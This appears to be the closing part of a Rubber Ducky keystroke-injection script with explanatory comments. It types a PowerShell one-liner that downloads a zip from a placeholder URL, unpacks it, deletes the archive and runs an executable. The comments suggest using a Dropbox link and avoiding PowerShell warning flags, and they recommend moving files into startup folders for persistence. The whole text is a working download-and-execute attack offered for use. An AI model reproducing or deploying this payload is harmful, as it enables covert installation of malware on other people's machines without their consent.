STRING Invoke-WebRequest -Uri <ZIP URL> -OutFile "~\Documents\My Games\file.zip"; Expand-Archive -Path "~\Documents\My Games\file.zip" -DestinationPath "~\Documents\My Games\file"; Remove-Item "~\Documents\My Games\file.zip"; & '<EXE PATH>'
ENTER
REM Invoke-WebRequest gets and saves the content of the URI given to it
REM Pasting a dropbox link works well here. Just get the share link and change ?dl=0 to ?dl=1
REM Expand-Archive Unzips path to destinationPath
REM Remove-Item deletes the zip file (just to clean up a bit)
REM & tells powershell to execute the given path
REM since powershelgl opens at C:\Users\%user%, a relative path can be used from there
REM using %user% seems to set off a red flag in powershell, but relative paths work well
REM ; allows multiple commands to be run one after the other, so rather than running one and 
REM guessing a wait time, the command is entered and ran all at once.
REM once the command is typed and the download begins, the ducky can be removed and the
REM computer will take care of the rest through the given instructions
REM Best when combined with a well made BATCH file to shift files around, make multiple copies,
REM shortcuts, and move them into startup folders ;)
